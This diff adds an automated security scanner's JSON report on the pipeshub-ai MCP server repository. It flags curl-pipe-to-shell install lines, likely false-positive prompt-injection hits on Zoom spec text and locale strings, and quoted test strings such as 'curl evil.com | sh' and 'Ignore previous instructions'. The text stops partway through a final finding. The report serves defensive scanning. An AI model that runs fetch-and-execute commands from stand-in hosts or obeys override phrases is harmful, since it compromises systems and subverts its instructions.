@@ -1,0 +1,783 @@
+{
+  "item": {
+    "source": "github:mcp-server",
+    "ecosystem": "GitHub",
+    "name": "pipeshub-ai/pipeshub-ai",
+    "version": "94eb1712963e459b6dd684e644eb64a09718edad",
+    "download": "https://codeload.github.com/pipeshub-ai/pipeshub-ai/tar.gz/94eb1712963e459b6dd684e644eb64a09718edad"
+  },
+  "archive_sha256": "475204a3bd068ad3bf9514d10611828ce6295a958e834cc7a9c6e67c58714ad7",
+  "findings": [
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/integration-tests/response-validation/mcp/golden/mcp_surface_4.10.0.json",
+      "line": 321,
+      "evidence": "p=0.92 Download the file as stored for one record — not PipesHub's parsed\\u{a}content, meta",
+      "file_sha256": "7e8c5929dc4bf6eda5201459742795d87dc03e122db10fcddf77080e0a28d8db"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/CHANGELOG.md",
+      "line": 209,
+      "evidence": "curl | bash",
+      "file_sha256": "138de847f1e09538e260f5bf4cb9f9562a1d0de1102bffd227c04f08ac5c0345"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/changelog/0.7.0.md",
+      "line": 57,
+      "evidence": "curl | bash",
+      "file_sha256": "56503cbaced94d01f76135abe71316dec9e52d6f7c6349924056bf1e052613b8"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/README.md",
+      "line": 58,
+      "evidence": "curl -fsSL https://get.pipeshub.com/install | bash",
+      "file_sha256": "47066af21d48e32fcab6961848d60e78efb77aa86675dd1ddbc8c7f6e759fd13"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/deployment/docker-compose/hot-reload/Dockerfile.dev",
+      "line": 33,
+      "evidence": "curl https://sh.rustup.rs -sSf | sh",
+      "file_sha256": "63ddf2c51f4d492333ce5aba7943c6d19ff4159ff75abb9cae0061f6dfe1f0e2"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/deployment/docker-compose/tests/installer_test.sh",
+      "line": 195,
+      "evidence": "curl does not cd\" \"$inner\" \"curl | bash",
+      "file_sha256": "a3dafd24936e72788b4ef2991a86a95906a31cf64095ec0496fa8c223ca062b7"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/deployment/docker-compose/install.sh",
+      "line": 543,
+      "evidence": "curl | bash",
+      "file_sha256": "10443a5f0b682a0571b4a19f25e560c30341e61e5ff92855b8653c61bec58a36"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/deployment/docker-compose/ADVANCED_DEPLOYMENT.md",
+      "line": 30,
+      "evidence": "curl -fsSL https://get.pipeshub.com/install | bash",
+      "file_sha256": "e083f48db554cd1abe9898cc539b6a46cbe45246d4da573b6572edcd90a6c8f6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/deployment/sandbox/Dockerfile",
+      "line": 26,
+      "evidence": "curl -fsSL https://deb.nodesource.com/setup_20.x | bash",
+      "file_sha256": "ca38ce2d3a9ed09212b496032b8fd4d103c254598eac2f4002154c49b07c92f4"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/frontend/lib/i18n/locales/de-DE.json",
+      "line": 3099,
+      "evidence": "p=0.92 Indexierungsfilter gelten immer. Aktivieren oder deaktivieren Sie Optionen und p",
+      "file_sha256": "e37e3082b47a51b71e97b283d92cf47f8c4e584a57a1c9768d225989a56d1297"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/frontend/lib/i18n/locales/de-DE.json",
+      "line": 5721,
+      "evidence": "p=1.00 Die eigenen Daten Ihres Unternehmens sind jetzt in PipesHub. Die Demo ist in Ant",
+      "file_sha256": "e37e3082b47a51b71e97b283d92cf47f8c4e584a57a1c9768d225989a56d1297"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/frontend/lib/i18n/locales/de-DE.json",
+      "line": 5728,
+      "evidence": "p=0.97 Damit werden der Demo-Connector und alle zugehörigen Datensätze, Gruppen und Ber",
+      "file_sha256": "e37e3082b47a51b71e97b283d92cf47f8c4e584a57a1c9768d225989a56d1297"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/frontend/scripts/electron/build.mjs",
+      "line": 72,
+      "evidence": "execSync(`command -v ${command}`, { encoding: 'utf8', stdio: ['ignore', 'pipe', ",
+      "file_sha256": "56da3e83ce59549384ec7946d78babb25ea57b38cd96ab61c464778d0110c7eb"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/frontend/scripts/electron/build.mjs",
+      "line": 92,
+      "evidence": "execSync(`${pyenv} root`, { encoding: 'utf8', stdio: ['ignore', 'pipe', 'ignore'",
+      "file_sha256": "56da3e83ce59549384ec7946d78babb25ea57b38cd96ab61c464778d0110c7eb"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/install.sh",
+      "line": 11,
+      "evidence": "curl -fsSL https://get.pipeshub.com/install | bash",
+      "file_sha256": "d91206634c2861378e65b8905e94b6f8da6f85c06f2c744de14feb19a1a99604"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/scripts/test_workflow_trust.py",
+      "line": 1115,
+      "evidence": "curl evil | sh",
+      "file_sha256": "c29c3833f92c59fa6328efaa987f9185aa29c5c22f3c16ad819e85c9646ed2a9"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/scripts/Makefile",
+      "line": 154,
+      "evidence": "curl -LsSf https://astral.sh/uv/install.sh | sh",
+      "file_sha256": "c0af57a26d927c2c7c81184402f2c30686f4c90788c292e196f015102a83b109"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/docs/i18n/zh-CN/README.md",
+      "line": 226,
+      "evidence": "curl -fsSL https://get.pipeshub.com/install | bash",
+      "file_sha256": "7233dd8e2b061c50a983f0caa7074f8848fecd98df8096c143e3a4bfe953dadf"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/docs/i18n/de/README.md",
+      "line": 226,
+      "evidence": "curl -fsSL https://get.pipeshub.com/install | bash",
+      "file_sha256": "a5dc725d91d48d86e9b34e3d1997bdf7ef01e9cf58f8f47c9d4a3b04f7c85ec5"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/docs/i18n/it/README.md",
+      "line": 226,
+      "evidence": "curl -fsSL https://get.pipeshub.com/install | bash",
+      "file_sha256": "0c898c52b7c1f27b2d15c81580e9cc21ccc8b03eaa6be96c88a73ed06e4cb9ba"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/docs/i18n/vi/README.md",
+      "line": 226,
+      "evidence": "curl -fsSL https://get.pipeshub.com/install | bash",
+      "file_sha256": "278bfb50040c5cadf77219fd6e19041d1dc5f2e50a62d3dafa368b5bdfdad4cd"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/docs/i18n/ru/README.md",
+      "line": 226,
+      "evidence": "curl -fsSL https://get.pipeshub.com/install | bash",
+      "file_sha256": "e7a744a4043be5e45aa4f071d08bd8ef28e8af4fbbdb145a3dbe833db706721e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/docs/i18n/fr/README.md",
+      "line": 226,
+      "evidence": "curl -fsSL https://get.pipeshub.com/install | bash",
+      "file_sha256": "7cdc310fe35e75325e129a2af7ef86ab0acb577edde40e34d5be01c151660599"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/docs/i18n/tr/README.md",
+      "line": 226,
+      "evidence": "curl -fsSL https://get.pipeshub.com/install | bash",
+      "file_sha256": "e1813435452a30343ac959d04d7ae9236d8042e6368cca7dabfb5db323645322"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/docs/i18n/ja/README.md",
+      "line": 226,
+      "evidence": "curl -fsSL https://get.pipeshub.com/install | bash",
+      "file_sha256": "12a070879204fbd4224ae52de959b213bf17ac1bbc38cc6afb366273272be874"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/docs/i18n/pt/README.md",
+      "line": 226,
+      "evidence": "curl -fsSL https://get.pipeshub.com/install | bash",
+      "file_sha256": "f54be76e5b3afc204eddb2d7cb761e0f43bf14245742649d8c206024be052639"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/docs/i18n/he/README.md",
+      "line": 228,
+      "evidence": "curl -fsSL https://get.pipeshub.com/install | bash",
+      "file_sha256": "68e5848df95287f3bf5e68b8e0093abccc1002684ca97909c31b91b60b5876ad"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/docs/i18n/ko/README.md",
+      "line": 226,
+      "evidence": "curl -fsSL https://get.pipeshub.com/install | bash",
+      "file_sha256": "0d015382a4a8523473ae1e091d0e02e12ad182f8b03a982fd028860ffb86a388"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/docs/i18n/cs/README.md",
+      "line": 58,
+      "evidence": "curl -fsSL https://get.pipeshub.com/install | bash",
+      "file_sha256": "87cd691b1967249113a2fabb4b5107fb08d95ce53e26d53fad08934a89c64818"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/docs/i18n/es/README.md",
+      "line": 226,
+      "evidence": "curl -fsSL https://get.pipeshub.com/install | bash",
+      "file_sha256": "bd739f6e5b8cd55eaa042ca96f2459ac01d05ab7d53bdbc5dd837de61d83f91f"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/backend/python/code-generator/zoom_specs/Clips.json",
+      "line": 1,
+      "evidence": "p=0.95 The type of the comment.\\u{a}\\u{a}TEXT_WITH_MENTION – A comment that includes a mention.",
+      "file_sha256": "ce50cb34e78013885e145de14bbb33c97ad06322397b3f90507c51cddfeb8118"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/backend/python/code-generator/zoom_specs/Meetings.json",
+      "line": 1,
+      "evidence": "p=0.94 The given answer. If this is a live answer, the value is 'live answered'.\\u{a}**Note",
+      "file_sha256": "48f8772ecef0226c182d66a1409c3f6a5b31e4f39c51bd9561f6ae53e45bb0ce"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/backend/python/code-generator/zoom_specs/Meetings.json",
+      "line": 1,
+      "evidence": "p=0.94 The given answer. If this is a live answer, the value is 'live answered'.\\u{a}**Note",
+      "file_sha256": "48f8772ecef0226c182d66a1409c3f6a5b31e4f39c51bd9561f6ae53e45bb0ce"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/backend/python/code-generator/zoom_specs/Team Chat.json",
+      "line": 1,
+      "evidence": "p=0.93 Users that reacted to this message with this emoji.",
+      "file_sha256": "dd6d7f001a6c8adefa90c89179448bbaa2d93659f1d931a0138b9e78e9a38cf9"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/backend/python/code-generator/zoom_specs/Users.json",
+      "line": 1,
+      "evidence": "p=0.93 This setting applies for regular meetings that do not use PMI. If enabled, a pas",
+      "file_sha256": "cfdd116c19c1981d40af919fe1ad0bc1465a58bc5864cc496d4f971d6042803a"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/backend/python/code-generator/zoom_specs/Users.json",
+      "line": 1,
+      "evidence": "p=0.98 This setting applies for regular meetings that do not use a PMI. If enabled, a p",
+      "file_sha256": "cfdd116c19c1981d40af919fe1ad0bc1465a58bc5864cc496d4f971d6042803a"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/backend/python/code-generator/zoom_specs/Users.json",
+      "line": 1,
+      "evidence": "p=0.93 This setting applies for regular meetings that do not use PMI. If enabled, a pas",
+      "file_sha256": "cfdd116c19c1981d40af919fe1ad0bc1465a58bc5864cc496d4f971d6042803a"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/backend/python/code-generator/zoom_specs/Users.json",
+      "line": 1,
+      "evidence": "p=0.99 \\u{a}This setting specifies the max length of consecutive characters(abcde...) that ",
+      "file_sha256": "cfdd116c19c1981d40af919fe1ad0bc1465a58bc5864cc496d4f971d6042803a"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/backend/python/code-generator/zoom_specs/Accounts.json",
+      "line": 1,
+      "evidence": "p=0.92 Allow users to use the emoji library in direct messages or group conversations. ",
+      "file_sha256": "fa5fe2cb3b31ea7663905cc9512d2680d512fa2759b9959e73d789b982e4f98e"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/backend/python/code-generator/zoom_specs/Accounts.json",
+      "line": 1,
+      "evidence": "p=0.99 \\u{a}Specify the max length of consecutive characters(abcde...) that can be used in ",
+      "file_sha256": "fa5fe2cb3b31ea7663905cc9512d2680d512fa2759b9959e73d789b982e4f98e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/backend/python/code-generator/zoom_specs/Accounts.json",
+      "line": 1,
+      "evidence": "p=0.96 The specific instructions to configure a custom livestream.",
+      "file_sha256": "fa5fe2cb3b31ea7663905cc9512d2680d512fa2759b9959e73d789b982e4f98e"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/backend/python/code-generator/zoom_specs/Accounts.json",
+      "line": 1,
+      "evidence": "p=0.99 \\u{a}Specify the max length of consecutive characters(abcde...) that can be used in ",
+      "file_sha256": "fa5fe2cb3b31ea7663905cc9512d2680d512fa2759b9959e73d789b982e4f98e"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/backend/python/code-generator/zoom_specs/Accounts.json",
+      "line": 1,
+      "evidence": "p=0.99 \\u{a}Specify the max length of consecutive characters(abcde...) that can be used in ",
+      "file_sha256": "fa5fe2cb3b31ea7663905cc9512d2680d512fa2759b9959e73d789b982e4f98e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/backend/python/code-generator/zoom_specs/Accounts.json",
+      "line": 1,
+      "evidence": "p=0.96 The specific instructions to configure a custom livestream.",
+      "file_sha256": "fa5fe2cb3b31ea7663905cc9512d2680d512fa2759b9959e73d789b982e4f98e"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/backend/python/code-generator/zoom_specs/Accounts.json",
+      "line": 1,
+      "evidence": "p=0.99 \\u{a}Specify the max length of consecutive characters(abcde...) that can be used in ",
+      "file_sha256": "fa5fe2cb3b31ea7663905cc9512d2680d512fa2759b9959e73d789b982e4f98e"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/backend/python/code-generator/zoom_specs/Phone.json",
+      "line": 1,
+      "evidence": "p=0.99 The voicemail leaving instruction prompt name.",
+      "file_sha256": "5182177c805ece546ece9db2fafdd6b57c07cf8d5b92c1f842c220a17d77bc7c"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/backend/python/code-generator/zoom_specs/Phone.json",
+      "line": 1,
+      "evidence": "p=0.99 The voicemail leaving instruction prompt name.",
+      "file_sha256": "5182177c805ece546ece9db2fafdd6b57c07cf8d5b92c1f842c220a17d77bc7c"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/backend/python/code-generator/zoom_specs/Phone.json",
+      "line": 1,
+      "evidence": "p=0.99 The voicemail leaving instruction prompt name.",
+      "file_sha256": "5182177c805ece546ece9db2fafdd6b57c07cf8d5b92c1f842c220a17d77bc7c"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/backend/python/code-generator/zoom_specs/Phone.json",
+      "line": 1,
+      "evidence": "p=0.99 The voicemail leaving instruction prompt name.",
+      "file_sha256": "5182177c805ece546ece9db2fafdd6b57c07cf8d5b92c1f842c220a17d77bc7c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/backend/python/code-generator/zoom_specs/Phone.json",
+      "line": 1,
+      "evidence": "p=0.91 The content that needs to be sent as an SMS. Maximum length is 500 characters. M",
+      "file_sha256": "5182177c805ece546ece9db2fafdd6b57c07cf8d5b92c1f842c220a17d77bc7c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/backend/python/code-generator/zoom_specs/Phone.json",
+      "line": 1,
+      "evidence": "p=0.90 This field allows users to edit call handling settings.Once disabled, users will",
+      "file_sha256": "5182177c805ece546ece9db2fafdd6b57c07cf8d5b92c1f842c220a17d77bc7c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/backend/python/code-generator/zoom_specs/Phone.json",
+      "line": 1,
+      "evidence": "p=0.90 This field allows users to edit call handling settings.Once disabled, users will",
+      "file_sha256": "5182177c805ece546ece9db2fafdd6b57c07cf8d5b92c1f842c220a17d77bc7c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/backend/python/code-generator/zoom_specs/Phone.json",
+      "line": 1,
+      "evidence": "p=0.91 This field allows users to forward their calls outside of their own site.Once di",
+      "file_sha256": "5182177c805ece546ece9db2fafdd6b57c07cf8d5b92c1f842c220a17d77bc7c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/backend/python/code-generator/zoom_specs/Phone.json",
+      "line": 1,
+      "evidence": "p=0.91 This field allows users to forward their calls outside of their own site.Once di",
+      "file_sha256": "5182177c805ece546ece9db2fafdd6b57c07cf8d5b92c1f842c220a17d77bc7c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/backend/python/code-generator/zoom_specs/Phone.json",
+      "line": 1,
+      "evidence": "p=0.91 Enables incoming direct external callers will be prompted to respond to a button",
+      "file_sha256": "5182177c805ece546ece9db2fafdd6b57c07cf8d5b92c1f842c220a17d77bc7c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/backend/python/code-generator/zoom_specs/Phone.json",
+      "line": 1,
+      "evidence": "p=0.91 This field allows users to forward their calls outside of their own site.Once di",
+      "file_sha256": "5182177c805ece546ece9db2fafdd6b57c07cf8d5b92c1f842c220a17d77bc7c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/backend/python/code-generator/zoom_specs/Phone.json",
+      "line": 1,
+      "evidence": "p=0.91 This field allows users to forward their calls outside of their own site.Once di",
+      "file_sha256": "5182177c805ece546ece9db2fafdd6b57c07cf8d5b92c1f842c220a17d77bc7c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/backend/python/code-generator/zoom_specs/Phone.json",
+      "line": 1,
+      "evidence": "p=0.95 This setting enables incoming direct external callers will be prompted to respon",
+      "file_sha256": "5182177c805ece546ece9db2fafdd6b57c07cf8d5b92c1f842c220a17d77bc7c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/backend/python/code-generator/zoom_specs/Phone.json",
+      "line": 1,
+      "evidence": "p=0.95 The audio prompt for `Leave voicemail instruction`",
+      "file_sha256": "5182177c805ece546ece9db2fafdd6b57c07cf8d5b92c1f842c220a17d77bc7c"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/backend/python/code-generator/zoom_specs/Rooms.json",
+      "line": 1,
+      "evidence": "p=0.99 Hide share instructions from TV.",
+      "file_sha256": "343bfd3e67045d138154ad1edceae050d0f6029db832b65bf76f99889ae4a090"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/backend/python/code-generator/zoom_specs/Rooms.json",
+      "line": 1,
+      "evidence": "p=0.99 Hide share instructions from TV.",
+      "file_sha256": "343bfd3e67045d138154ad1edceae050d0f6029db832b65bf76f99889ae4a090"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/backend/python/code-generator/zoom_specs/Rooms.json",
+      "line": 1,
+      "evidence": "p=0.95 Rooms with under construction mode enabled are hidden on the dashboard by defaul",
+      "file_sha256": "343bfd3e67045d138154ad1edceae050d0f6029db832b65bf76f99889ae4a090"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/backend/python/code-generator/zoom_specs/Rooms.json",
+      "line": 1,
+      "evidence": "p=0.95 Rooms with under construction mode enabled are hidden on the dashboard by defaul",
+      "file_sha256": "343bfd3e67045d138154ad1edceae050d0f6029db832b65bf76f99889ae4a090"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/backend/python/tests/unit/services/skills/test_npm_command_parser.py",
+      "line": 118,
+      "evidence": "curl evil.com | sh",
+      "file_sha256": "2e63f440eb4b083cd20eecb68868685c42345491d18d7b1845f1d81f6e87c8d5"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/backend/python/tests/unit/web/qa/test_fetch_scenarios.py",
+      "line": 79,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "fbd11882e87b649edc99b3e934721f596b221b40606b5bb5a049721651b2cf11"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/backend/python/tests/unit/web/test_url_and_untrusted.py",
+      "line": 51,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "01725148c550d260ef933baf30df20abaffbbe566e9463700746c3a975e26a5d"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0002",
+      "summary": "Bidirectional override characters can make text display differently from what the model reads",
